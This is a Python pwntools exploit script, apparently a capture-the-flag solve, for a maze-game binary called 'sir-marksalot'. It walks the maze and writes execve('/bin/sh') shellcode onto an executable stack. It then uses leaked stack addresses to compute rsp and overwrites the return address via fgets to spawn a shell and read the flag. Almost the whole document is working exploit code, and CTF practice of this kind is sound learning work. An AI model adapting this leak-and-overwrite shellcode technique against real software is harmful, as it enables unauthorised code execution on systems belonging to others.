#!/usr/bin/env python3

# shellcode version 2 based on fireshell solve (https://ctftime.org/writeup/31244)

'''
Summary:

Move to 0,0.
Write out shellcode (bytes 0-27, byte 28 should be 0xf
or at least 0x1 so we can move west again) 

Move west (up stack 32 bytes).
There's a stack address leak that we need to preserve, but do not need.
This leak + the location of the Grue (can be derived if you know the seed)
can be used to compute the location of rsp.

Move west again (up stack 32 bytes, 32 bytes above rsp).
Here there's another stack address leak, however this leak is rsp - 0x20, so
no need to really derive anything.

rdi will be pointing to this block when fgets is called.
fgets can overwrite the return address pushed to the stack
by play_maze.

Since NX disabled and the stack RWX, changing the return address to point
to 0,0 will execute our shellcode on fgets return.
'''

from pwn import *
from binascii import hexlify

binary = context.binary = ELF('./sir-marksalot')

def magicmarker(p,message):
	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', message)

if args.REMOTE:
	p = remote('chals.damctf.xyz', 31314)
else:
	p = process(binary.path)

# get started
p.sendlineafter(b'?\n',b'jump up and down')

# find myself (array base 0)
p.sendlineafter(b'): ',b'm')
y = -1
for i in range(80):
	_ = p.recvline().strip()
	if b'|' in _:
		y += 1
	if b'*' in _:
		x = (2 + _.find(b'*')) // 4 - 1
		break

log.info('you are here {x},{y}'.format(x = x, y = y))

# move to 0,0
for i in range(y):
	magicmarker(p, 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'w')
	print('^',end='')
for i in range(x):
	magicmarker(p, 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'a')
	print('<',end='')
print()

# write out shellcode at 0,0 then move west
shellcode  = b''
shellcode += asm(f'''
mov rax, {'0x' + hexlify(b'/bin/sh'[::-1]).decode()}
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov eax, {constants.SYS_execve}
syscall
''')
shellcode += (0x20 - len(shellcode)) * b'\xff'
magicmarker(p,shellcode)
p.sendlineafter(b'): ', b'a')

# preserve leak, do not need, but need to preserve, then move west
# easier stack leak further west
p.recvuntil(b'On the wall is written: ')
leak = u64(p.recv(6) + b'\0\0')
log.info('leak: {leak}'.format(leak = hex(leak)))
magicmarker(p,p64(leak) + 0x16 * b'\xff' + b'\n') # need short write to not kill shellcode
p.sendlineafter(b'): ', b'a')

# had to get entire line and work back, local vs remote different
p.recvuntil(b'On the wall is written: ')
_ = p.recvline().strip()
rsp = u64(_[-6:] + b'\0\0') + 0x20
log.info('rsp: {loc}'.format(loc = hex(rsp)))

# the magic, fgets to overwrite the return address for fgets to run our shellcode in 0,0
magicmarker(p, 0x18 * b'A' + p64(rsp + 0x20))
p.sendline(b'cat flag')
print(p.recvline().strip().decode())
